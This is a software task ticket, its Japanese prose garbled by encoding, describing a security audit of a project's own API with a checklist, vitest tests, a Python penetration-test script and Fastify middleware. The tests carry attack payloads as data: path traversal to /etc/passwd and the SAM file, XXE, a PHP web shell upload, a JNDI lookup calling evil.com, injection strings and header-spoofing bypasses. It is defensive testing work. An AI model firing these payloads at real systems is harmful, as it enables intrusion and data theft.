# 0067: ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ã¨ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆ

## èª¬æ˜

ã‚·ã‚¹ãƒ†ãƒ å…¨ä½“ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ã¨ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚’å®Ÿæ–½ã™ã‚‹ã€‚OWASP Top 10ã«åŸºã¥ãè„†å¼±æ€§è¨ºæ–­ã€èªè¨¼ãƒ»èªå¯ã®æ¤œè¨¼ã€ãƒ‡ãƒ¼ã‚¿ä¿è­·ã®ç¢ºèªã€ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã®ãƒ†ã‚¹ãƒˆã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šã®ç›£æŸ»ãªã©ã‚’å«ã‚€åŒ…æ‹¬çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ã‚’è¡Œã„ã€ç™ºè¦‹ã•ã‚ŒãŸè„†å¼±æ€§ã«å¯¾ã™ã‚‹å¯¾ç­–ã‚’å®Ÿè£…ã™ã‚‹ã€‚

## ã‚¿ã‚¹ã‚¯ç¨®åˆ¥

- [ ] æ©Ÿèƒ½å®Ÿè£…
- [ ] ãƒã‚°ä¿®æ­£
- [ ] ãƒªãƒ•ã‚¡ã‚¯ã‚¿ãƒªãƒ³ã‚°
- [x] ãƒ†ã‚¹ãƒˆ
- [ ] ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ
- [ ] èª¿æŸ»

## å„ªå…ˆåº¦

é«˜

## è¦‹ç©ã‚‚ã‚Šå·¥æ•°

[ã‚¹ãƒˆãƒ¼ãƒªãƒ¼ãƒã‚¤ãƒ³ãƒˆ: 5] (ç´„2-3æ—¥)

## ä¾å­˜é–¢ä¿‚

- å‰æã‚¿ã‚¹ã‚¯: #0031, #0033, #0034, #0058
- é–¢é€£ã‚¿ã‚¹ã‚¯: #0066

## å—ã‘å…¥ã‚ŒåŸºæº–

- [ ] OWASP Top 10ã®è„†å¼±æ€§ãƒã‚§ãƒƒã‚¯ãŒå®Œäº†ã—ã¦ã„ã‚‹
- [ ] èªè¨¼ãƒ»èªå¯ã‚·ã‚¹ãƒ†ãƒ ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆãŒå®Ÿæ–½ã•ã‚Œã¦ã„ã‚‹
- [ ] APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆãŒå®Œäº†ã—ã¦ã„ã‚‹
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ã®æ¤œè¨¼ãŒè¡Œã‚ã‚Œã¦ã„ã‚‹
- [ ] æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã®æš—å·åŒ–ãŒç¢ºèªã•ã‚Œã¦ã„ã‚‹
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ãƒ¬ãƒãƒ¼ãƒˆãŒä½œæˆã•ã‚Œã¦ã„ã‚‹
- [ ] ç™ºè¦‹ã•ã‚ŒãŸè„†å¼±æ€§ã®å¯¾ç­–ãŒå®Ÿè£…ã•ã‚Œã¦ã„ã‚‹
- [ ] å†ãƒ†ã‚¹ãƒˆã§è„†å¼±æ€§ãŒè§£æ¶ˆã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèª

## æŠ€è¡“çš„ãªè©³ç´°

### ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

```yaml
# security/audit-checklist.yml
security_audit:
  authentication:
    - jwt_token_validation:
        description: 'JWTãƒˆãƒ¼ã‚¯ãƒ³ã®æ¤œè¨¼ãŒé©åˆ‡ã«è¡Œã‚ã‚Œã¦ã„ã‚‹ã‹'
        severity: critical
        test_cases:
          - expired_token_rejection
          - invalid_signature_detection
          - algorithm_confusion_attack
          - token_replay_attack

    - session_management:
        description: 'ã‚»ãƒƒã‚·ãƒ§ãƒ³ç®¡ç†ã®å®‰å…¨æ€§'
        severity: high
        test_cases:
          - session_fixation
          - session_timeout
          - concurrent_session_handling
          - logout_effectiveness

  authorization:
    - access_control:
        description: 'ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã®å®Ÿè£…'
        severity: critical
        test_cases:
          - horizontal_privilege_escalation
          - vertical_privilege_escalation
          - forced_browsing
          - insecure_direct_object_references

    - rate_limiting:
        description: 'ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã®æœ‰åŠ¹æ€§'
        severity: medium
        test_cases:
          - rate_limit_bypass_attempts
          - distributed_attack_simulation
          - tier_boundary_testing

  data_protection:
    - encryption:
        description: 'ãƒ‡ãƒ¼ã‚¿æš—å·åŒ–ã®å®Ÿè£…'
        severity: high
        test_cases:
          - data_in_transit_encryption
          - data_at_rest_encryption
          - key_management_security
          - cryptographic_strength

    - sensitive_data_exposure:
        description: 'æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã®éœ²å‡ºé˜²æ­¢'
        severity: critical
        test_cases:
          - api_response_filtering
          - error_message_information_leakage
          - log_file_exposure
          - backup_file_access

  injection_attacks:
    - sql_injection:
        description: 'SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¯¾ç­–'
        severity: critical
        test_cases:
          - parameterized_query_usage
          - input_validation
          - stored_procedure_security

    - command_injection:
        description: 'ã‚³ãƒãƒ³ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¯¾ç­–'
        severity: critical
        test_cases:
          - shell_command_execution
          - file_system_access
          - process_spawning

    - path_traversal:
        description: 'ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«å¯¾ç­–'
        severity: high
        test_cases:
          - directory_traversal_attempts
          - file_inclusion_attacks
          - symbolic_link_attacks

  security_headers:
    - required_headers:
        description: 'å¿…é ˆã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼'
        severity: medium
        headers:
          - X-Content-Type-Options: nosniff
          - X-Frame-Options: DENY
          - X-XSS-Protection: '1; mode=block'
          - Strict-Transport-Security: 'max-age=31536000; includeSubDomains'
          - Content-Security-Policy: "default-src 'self'"
```

### è‡ªå‹•ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒˆ

```typescript
// test/security/security-audit.test.ts
import { describe, it, expect } from 'vitest';
import axios from 'axios';
import jwt from 'jsonwebtoken';
import { OWASP_PAYLOADS } from './payloads/owasp-top-10';

const API_URL = process.env.API_URL || 'http://localhost:3000';

describe('Security Audit Tests', () => {
  describe('Authentication Security', () => {
    it('should reject expired JWT tokens', async () => {
      const expiredToken = jwt.sign(
        { sub: 'user123', exp: Math.floor(Date.now() / 1000) - 3600 },
        'wrong-secret',
      );

      try {
        await axios.get(`${API_URL}/secure/data.json`, {
          headers: { Authorization: `Bearer ${expiredToken}` },
        });
        expect.fail('Should have rejected expired token');
      } catch (error) {
        expect(error.response.status).toBe(401);
        expect(error.response.data.detail).toContain('token expired');
      }
    });

    it('should prevent JWT algorithm confusion attack', async () => {
      // HSã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã§ç½²åã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã‚’RSã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã¨ã—ã¦æ¤œè¨¼ã•ã›ã‚‹è©¦ã¿
      const maliciousToken = jwt.sign({ sub: 'user123', admin: true }, 'public-key-content', {
        algorithm: 'HS256',
      });

      try {
        await axios.get(`${API_URL}/secure/data.json`, {
          headers: { Authorization: `Bearer ${maliciousToken}` },
        });
        expect.fail('Should have rejected algorithm confusion attack');
      } catch (error) {
        expect(error.response.status).toBe(401);
      }
    });

    it('should enforce secure session management', async () => {
      // ã‚»ãƒƒã‚·ãƒ§ãƒ³å›ºå®šæ”»æ’ƒã®ãƒ†ã‚¹ãƒˆ
      const fixedSessionId = 'attacker-controlled-session';

      const response1 = await axios.post(
        `${API_URL}/auth/login`,
        {
          token: 'valid-token',
        },
        {
          headers: { Cookie: `session=${fixedSessionId}` },
        },
      );

      // ãƒ­ã‚°ã‚¤ãƒ³å¾Œã®ã‚»ãƒƒã‚·ãƒ§ãƒ³IDãŒå¤‰æ›´ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèª
      const newSessionId = response1.headers['set-cookie']
        ?.find((cookie) => cookie.startsWith('session='))
        ?.split(';')[0]
        ?.split('=')[1];

      expect(newSessionId).toBeDefined();
      expect(newSessionId).not.toBe(fixedSessionId);
    });
  });

  describe('Authorization Security', () => {
    it('should prevent horizontal privilege escalation', async () => {
      const user1Token = await getValidToken('user1');
      const user2DataUrl = `${API_URL}/users/user2/private-data`;

      try {
        await axios.get(user2DataUrl, {
          headers: { Authorization: `Bearer ${user1Token}` },
        });
        expect.fail('Should have prevented access to other user data');
      } catch (error) {
        expect(error.response.status).toBe(403);
      }
    });

    it('should prevent vertical privilege escalation', async () => {
      const regularUserToken = await getValidToken('regular-user');
      const adminEndpoint = `${API_URL}/admin/users`;

      try {
        await axios.get(adminEndpoint, {
          headers: { Authorization: `Bearer ${regularUserToken}` },
        });
        expect.fail('Should have prevented access to admin endpoint');
      } catch (error) {
        expect(error.response.status).toBe(403);
      }
    });

    it('should enforce rate limiting correctly', async () => {
      const token = await getValidToken('test-user');
      const requests = [];

      // TIER1ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯60ãƒªã‚¯ã‚¨ã‚¹ãƒˆ/åˆ†
      for (let i = 0; i < 65; i++) {
        requests.push(
          axios.get(`${API_URL}/secure/test.json`, {
            headers: { Authorization: `Bearer ${token}` },
            validateStatus: () => true, // Don't throw on 429
          }),
        );
      }

      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter((r) => r.status === 429);

      expect(rateLimitedResponses.length).toBeGreaterThan(0);
      expect(rateLimitedResponses[0].headers['retry-after']).toBeDefined();
    });
  });

  describe('Injection Attack Prevention', () => {
    it('should prevent SQL injection attacks', async () => {
      const token = await getValidToken('test-user');
      const sqlInjectionPayloads = OWASP_PAYLOADS.sqlInjection;

      for (const payload of sqlInjectionPayloads) {
        const response = await axios.get(`${API_URL}/search`, {
          params: { q: payload },
          headers: { Authorization: `Bearer ${token}` },
          validateStatus: () => true,
        });

        // SQLã‚¨ãƒ©ãƒ¼ãŒãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«å«ã¾ã‚Œã¦ã„ãªã„ã“ã¨ã‚’ç¢ºèª
        expect(response.data).not.toMatch(/sql|syntax|error/i);
        expect([200, 400, 404]).toContain(response.status);
      }
    });

    it('should prevent path traversal attacks', async () => {
      const token = await getValidToken('test-user');
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        '..;/..;/..;/etc/passwd',
      ];

      for (const payload of pathTraversalPayloads) {
        try {
          await axios.get(`${API_URL}/secure/${payload}`, {
            headers: { Authorization: `Bearer ${token}` },
          });
          expect.fail('Should have blocked path traversal attempt');
        } catch (error) {
          expect(error.response.status).toBe(400);
          expect(error.response.data.detail).toContain('Invalid path');
        }
      }
    });

    it('should prevent XSS attacks in API responses', async () => {
      const token = await getValidToken('test-user');
      const xssPayloads = OWASP_PAYLOADS.xss;

      for (const payload of xssPayloads) {
        // ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’å«ã‚€ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ãƒ†ã‚¹ãƒˆ
        const response = await axios.post(
          `${API_URL}/comments`,
          {
            content: payload,
          },
          {
            headers: { Authorization: `Bearer ${token}` },
          },
        );

        // ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèª
        expect(response.data.content).not.toContain('<script>');
        expect(response.data.content).not.toContain('javascript:');
      }
    });
  });

  describe('Security Headers', () => {
    it('should include all required security headers', async () => {
      const response = await axios.get(`${API_URL}/health`);

      const requiredHeaders = {
        'x-content-type-options': 'nosniff',
        'x-frame-options': 'DENY',
        'strict-transport-security': /max-age=\d+/,
        'x-xss-protection': '1; mode=block',
      };

      for (const [header, expectedValue] of Object.entries(requiredHeaders)) {
        expect(response.headers[header]).toBeDefined();
        if (expectedValue instanceof RegExp) {
          expect(response.headers[header]).toMatch(expectedValue);
        } else {
          expect(response.headers[header]).toBe(expectedValue);
        }
      }
    });

    it('should implement proper CORS policy', async () => {
      const unauthorizedOrigin = 'http://evil.com';

      try {
        await axios.get(`${API_URL}/secure/data.json`, {
          headers: { Origin: unauthorizedOrigin },
        });
      } catch (error) {
        // CORSãƒãƒªã‚·ãƒ¼ã«ã‚ˆã‚Šãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã‚‹ã“ã¨ã‚’ç¢ºèª
        expect(error.response.headers['access-control-allow-origin']).not.toBe(unauthorizedOrigin);
      }
    });
  });

  describe('Data Protection', () => {
    it('should not expose sensitive data in error messages', async () => {
      const invalidRequests = [
        { url: '/users/invalid-id', method: 'GET' },
        { url: '/secure/nonexistent.json', method: 'GET' },
        { url: '/auth/login', method: 'POST', data: { invalid: 'data' } },
      ];

      for (const req of invalidRequests) {
        try {
          await axios({ ...req, url: `${API_URL}${req.url}` });
        } catch (error) {
          const errorData = error.response.data;

          // ã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã«æ©Ÿå¯†æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ãªã„ã“ã¨ã‚’ç¢ºèª
          expect(errorData).not.toMatch(/password|token|secret|key/i);
          expect(errorData).not.toMatch(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/); // IPã‚¢ãƒ‰ãƒ¬ã‚¹
          expect(errorData).not.toMatch(/\/home\/|\/var\/|C:\\/); // ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹
        }
      }
    });

    it('should properly sanitize log outputs', async () => {
      // ãƒ­ã‚°ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã®ãƒ†ã‚¹ãƒˆ
      const logInjectionPayloads = [
        '\n[ERROR] Fake error message',
        '\r\n{"level":"error","msg":"Injected log"}',
        '${jndi:ldap://evil.com/a}',
      ];

      const token = await getValidToken('test-user');

      for (const payload of logInjectionPayloads) {
        await axios.get(`${API_URL}/search`, {
          params: { q: payload },
          headers: { Authorization: `Bearer ${token}` },
          validateStatus: () => true,
        });
      }

      // ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç¢ºèªï¼ˆå®Ÿéš›ã®å®Ÿè£…ã§ã¯åˆ¥ã®æ–¹æ³•ã§ï¼‰
      // ãƒ­ã‚°ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãŒæˆåŠŸã—ã¦ã„ãªã„ã“ã¨ã‚’ç¢ºèª
    });
  });
});
```

### ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒˆ

```python
#!/usr/bin/env python3
# scripts/security/penetration-test.py

import requests
import json
import time
import concurrent.futures
from typing import List, Dict, Any
import urllib.parse

class PenetrationTester:
    def __init__(self, base_url: str, auth_token: str):
        self.base_url = base_url
        self.auth_token = auth_token
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {auth_token}'
        })
        self.vulnerabilities = []

    def run_all_tests(self):
        """å…¨ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œ"""
        print("ğŸ” Starting Penetration Test...")

        test_methods = [
            self.test_authentication_bypass,
            self.test_session_security,
            self.test_api_fuzzing,
            self.test_dos_attacks,
            self.test_business_logic,
            self.test_file_upload_security,
            self.test_api_versioning,
            self.test_information_disclosure
        ]

        for test in test_methods:
            print(f"\nâ–¶ï¸  Running {test.__name__}...")
            try:
                test()
            except Exception as e:
                print(f"âŒ Error in {test.__name__}: {str(e)}")

        self.generate_report()

    def test_authentication_bypass(self):
        """èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ãƒ†ã‚¹ãƒˆ"""
        bypass_attempts = [
            # ãƒ˜ãƒƒãƒ€ãƒ¼ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
            {'Authorization': 'Bearer null'},
            {'Authorization': 'Bearer undefined'},
            {'Authorization': 'Bearer '},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='},  # admin:admin
            {'X-Original-URL': '/admin'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '::1'},
        ]

        for headers in bypass_attempts:
            response = requests.get(
                f"{self.base_url}/secure/data.json",
                headers=headers,
                timeout=5
            )

            if response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'Authentication Bypass',
                    'severity': 'CRITICAL',
                    'details': f'Bypassed with headers: {headers}'
                })

    def test_session_security(self):
        """ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆ"""
        # ã‚»ãƒƒã‚·ãƒ§ãƒ³å›ºå®šæ”»æ’ƒ
        fixed_session = 'attacker-session-id'
        response = requests.post(
            f"{self.base_url}/auth/login",
            json={'token': self.auth_token},
            cookies={'session': fixed_session}
        )

        if 'set-cookie' in response.headers:
            new_session = self._extract_session_id(response.headers['set-cookie'])
            if new_session == fixed_session:
                self.vulnerabilities.append({
                    'type': 'Session Fixation',
                    'severity': 'HIGH',
                    'details': 'Session ID not regenerated after login'
                })

    def test_api_fuzzing(self):
        """APIãƒ•ã‚¡ã‚¸ãƒ³ã‚°ãƒ†ã‚¹ãƒˆ"""
        fuzz_payloads = [
            # é•·å¤§ãªå…¥åŠ›
            'A' * 10000,
            # ç‰¹æ®Šæ–‡å­—
            '!@#$%^&*()_+-=[]{}|;\':",./<>?',
            # Unicode
            'ğ•Šğ•†ğ•„ğ”¼ ğ•‹ğ”¼ğ•ğ•‹',
            # åˆ¶å¾¡æ–‡å­—
            '\x00\x01\x02\x03\x04',
            # SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
            "' OR '1'='1",
            # NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
            '{"$ne": null}',
            # XMLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]

        endpoints = [
            '/search?q=',
            '/users/',
            '/secure/',
        ]

        for endpoint in endpoints:
            for payload in fuzz_payloads:
                try:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}{urllib.parse.quote(payload)}",
                        timeout=5
                    )

                    # ã‚¨ãƒ©ãƒ¼æƒ…å ±ã®æ¼æ´©ãƒã‚§ãƒƒã‚¯
                    if any(error in response.text.lower() for error in
                           ['error', 'exception', 'stack', 'trace', 'sql']):
                        self.vulnerabilities.append({
                            'type': 'Information Disclosure',
                            'severity': 'MEDIUM',
                            'details': f'Error details exposed at {endpoint}'
                        })
                except:
                    pass

    def test_dos_attacks(self):
        """DoSæ”»æ’ƒãƒ†ã‚¹ãƒˆ"""
        # ã‚¹ãƒ­ãƒ¼ãƒ­ãƒªã‚¹æ”»æ’ƒã®ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³
        try:
            # å¤§é‡ã®ä¸¦è¡Œæ¥ç¶š
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                futures = []
                for _ in range(100):
                    future = executor.submit(
                        requests.get,
                        f"{self.base_url}/health",
                        timeout=0.1
                    )
                    futures.append(future)

                # çµæœã‚’å¾…ã¤
                concurrent.futures.wait(futures, timeout=10)
        except Exception as e:
            if 'timeout' in str(e).lower():
                self.vulnerabilities.append({
                    'type': 'DoS Vulnerability',
                    'severity': 'MEDIUM',
                    'details': 'Service becomes unresponsive under load'
                })

    def test_business_logic(self):
        """ãƒ“ã‚¸ãƒã‚¹ãƒ­ã‚¸ãƒƒã‚¯ã®è„†å¼±æ€§ãƒ†ã‚¹ãƒˆ"""
        # ãƒ¬ãƒ¼ãƒˆåˆ¶é™å›é¿ã®è©¦ã¿
        headers_variations = [
            {'X-Forwarded-For': f'192.168.1.{i}' for i in range(256)},
            {'X-Real-IP': f'10.0.0.{i}' for i in range(256)},
            {'Client-IP': f'172.16.0.{i}' for i in range(256)},
        ]

        # ç•°ãªã‚‹IPã‚¢ãƒ‰ãƒ¬ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã§ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’å›é¿
        success_count = 0
        for i in range(100):
            headers = {
                'X-Forwarded-For': f'192.168.1.{i}',
                'Authorization': f'Bearer {self.auth_token}'
            }
            response = requests.get(
                f"{self.base_url}/secure/data.json",
                headers=headers
            )
            if response.status_code == 200:
                success_count += 1

        if success_count > 60:  # TIER1ã®åˆ¶é™ã‚’è¶…ãˆã¦ã„ã‚‹
            self.vulnerabilities.append({
                'type': 'Rate Limit Bypass',
                'severity': 'HIGH',
                'details': f'Bypassed rate limit with IP spoofing ({success_count} requests succeeded)'
            })

    def test_file_upload_security(self):
        """ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆ"""
        if not self._endpoint_exists('/upload'):
            return

        malicious_files = [
            # PHPã‚¦ã‚§ãƒ–ã‚·ã‚§ãƒ«
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            # SVG XSS
            ('xss.svg', '<svg onload="alert(1)">', 'image/svg+xml'),
            # XXE
            ('xxe.xml', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'application/xml'),
        ]

        for filename, content, content_type in malicious_files:
            files = {'file': (filename, content, content_type)}
            response = self.session.post(
                f"{self.base_url}/upload",
                files=files
            )

            if response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'Unrestricted File Upload',
                    'severity': 'CRITICAL',
                    'details': f'Accepted malicious file: {filename}'
                })

    def test_api_versioning(self):
        """APIãƒãƒ¼ã‚¸ãƒ§ãƒ‹ãƒ³ã‚°ã®è„†å¼±æ€§ãƒ†ã‚¹ãƒˆ"""
        version_endpoints = [
            '/v1/secure/data.json',
            '/v0/secure/data.json',
            '/api/v1/secure/data.json',
            '/api/v2/secure/data.json',
        ]

        for endpoint in version_endpoints:
            response = requests.get(
                f"{self.base_url}{endpoint}",
                headers={'Authorization': f'Bearer {self.auth_token}'}
            )

            if response.status_code == 200:
                # å¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®APIãŒæœ‰åŠ¹ãªå ´åˆ
                if 'v0' in endpoint or 'v1' in endpoint:
                    self.vulnerabilities.append({
                        'type': 'Deprecated API Version',
                        'severity': 'LOW',
                        'details': f'Old API version still accessible: {endpoint}'
                    })

    def test_information_disclosure(self):
        """æƒ…å ±æ¼æ´©ãƒ†ã‚¹ãƒˆ"""
        sensitive_endpoints = [
            '/.git/config',
            '/.env',
            '/config.json',
            '/phpinfo.php',
            '/backup.zip',
            '/.DS_Store',
            '/robots.txt',
            '/sitemap.xml',
        ]

        for endpoint in sensitive_endpoints:
            response = requests.get(f"{self.base_url}{endpoint}")

            if response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'Sensitive File Exposure',
                    'severity': 'HIGH',
                    'details': f'Sensitive file accessible: {endpoint}'
                })

    def generate_report(self):
        """ãƒ¬ãƒãƒ¼ãƒˆç”Ÿæˆ"""
        report = {
            'test_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'target': self.base_url,
            'total_vulnerabilities': len(self.vulnerabilities),
            'critical': len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']),
            'high': len([v for v in self.vulnerabilities if v['severity'] == 'HIGH']),
            'medium': len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']),
            'low': len([v for v in self.vulnerabilities if v['severity'] == 'LOW']),
            'vulnerabilities': self.vulnerabilities
        }

        with open('penetration-test-report.json', 'w') as f:
            json.dump(report, f, indent=2)

        print("\nğŸ“Š Penetration Test Summary:")
        print(f"Total Vulnerabilities: {report['total_vulnerabilities']}")
        print(f"Critical: {report['critical']}")
        print(f"High: {report['high']}")
        print(f"Medium: {report['medium']}")
        print(f"Low: {report['low']}")

        if report['critical'] > 0 or report['high'] > 0:
            print("\nâš ï¸  CRITICAL/HIGH vulnerabilities found! Immediate action required.")

    def _endpoint_exists(self, endpoint: str) -> bool:
        """ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®å­˜åœ¨ç¢ºèª"""
        response = self.session.options(f"{self.base_url}{endpoint}")
        return response.status_code != 404

    def _extract_session_id(self, cookie_header: str) -> str:
        """Cookieãƒ˜ãƒƒãƒ€ãƒ¼ã‹ã‚‰ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã‚’æŠ½å‡º"""
        for cookie in cookie_header.split(';'):
            if 'session=' in cookie:
                return cookie.split('=')[1]
        return ''


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 3:
        print("Usage: python penetration-test.py <base_url> <auth_token>")
        sys.exit(1)

    base_url = sys.argv[1]
    auth_token = sys.argv[2]

    tester = PenetrationTester(base_url, auth_token)
    tester.run_all_tests()
```

### ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–å®Ÿè£…

```typescript
// src/security/security-middleware.ts
import { FastifyInstance, FastifyRequest, FastifyReply } from 'fastify';
import helmet from '@fastify/helmet';
import { createHash, randomBytes } from 'crypto';

export async function registerSecurityMiddleware(app: FastifyInstance) {
  // ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼
  await app.register(helmet, {
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", 'data:', 'https:'],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
  });

  // ãƒªã‚¯ã‚¨ã‚¹ãƒˆIDã®ç”Ÿæˆ
  app.addHook('onRequest', async (request, reply) => {
    request.id = randomBytes(16).toString('hex');
    reply.header('X-Request-ID', request.id);
  });

  // ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ­ã‚°
  app.addHook('onResponse', async (request, reply) => {
    // ä¸å¯©ãªã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã®æ¤œå‡º
    const suspiciousPatterns = [
      /(\.\.|%2e%2e)/i, // Path traversal
      /(union|select|insert|update|delete|drop)/i, // SQL injection
      /(<script|javascript:|onerror=)/i, // XSS
      /(\x00|\x01|\x02|\x03)/, // Null bytes
    ];

    const url = request.url;
    const body = JSON.stringify(request.body || {});

    for (const pattern of suspiciousPatterns) {
      if (pattern.test(url) || pattern.test(body)) {
        app.log.warn(
          {
            type: 'security_alert',
            request_id: request.id,
            ip: request.ip,
            method: request.method,
            url: request.url,
            pattern: pattern.toString(),
            user_agent: request.headers['user-agent'],
          },
          'Suspicious activity detected',
        );
        break;
      }
    }
  });

  // CSRFä¿è­·
  app.addHook('preHandler', async (request, reply) => {
    if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(request.method)) {
      const token = request.headers['x-csrf-token'];
      const sessionToken = request.session?.csrfToken;

      if (!token || token !== sessionToken) {
        reply.code(403).send({
          type: 'https://example.com/errors/csrf-validation-failed',
          title: 'CSRF Validation Failed',
          status: 403,
          detail: 'Invalid or missing CSRF token',
        });
      }
    }
  });
}

// å…¥åŠ›æ¤œè¨¼ã¨ã‚µãƒ‹ã‚¿ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³
export function sanitizeInput(input: any): any {
  if (typeof input === 'string') {
    // HTMLã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—
    return input
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;');
  }

  if (Array.isArray(input)) {
